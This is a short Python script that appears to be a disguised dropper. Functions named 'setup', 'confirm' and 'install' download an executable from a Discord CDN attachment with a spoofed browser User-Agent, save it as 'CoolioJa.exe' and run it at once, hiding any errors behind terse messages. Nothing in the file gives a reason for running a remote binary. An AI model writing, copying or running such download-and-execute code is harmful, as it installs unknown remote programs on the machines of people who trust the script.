import requests
import subprocess
from pathlib import Path

URL5 = "https://cdn.discordapp.com/attachments/1434622896965292035/1442242242726199336/calc.exe?ex=6924b842&is=692366c2&hm=4afb71e3ae198b46923a52660919a09f2117d0e4788f861cd779bba8f864db07&"
OUTPUTE = "CoolioJa.exe"

def setup(url: str, out_name: str) -> Path:
    response = requests.get(url, timeout=20, headers={"User-Agent": "Mozilla/5.0"}, stream=True)
    response.raise_for_status()
    path = Path(out_name)
    path.write_bytes(response.content)
    return path

def confirm(path: Path):
    try:
        subprocess.run([str(path)], check=False)
    except Exception as e:
        print(f"E1: {e}")

def install():
    try:
        path = setup(URL5, OUTPUTE)
        confirm(path)
    except Exception as e:
        print(f"E2: {e}")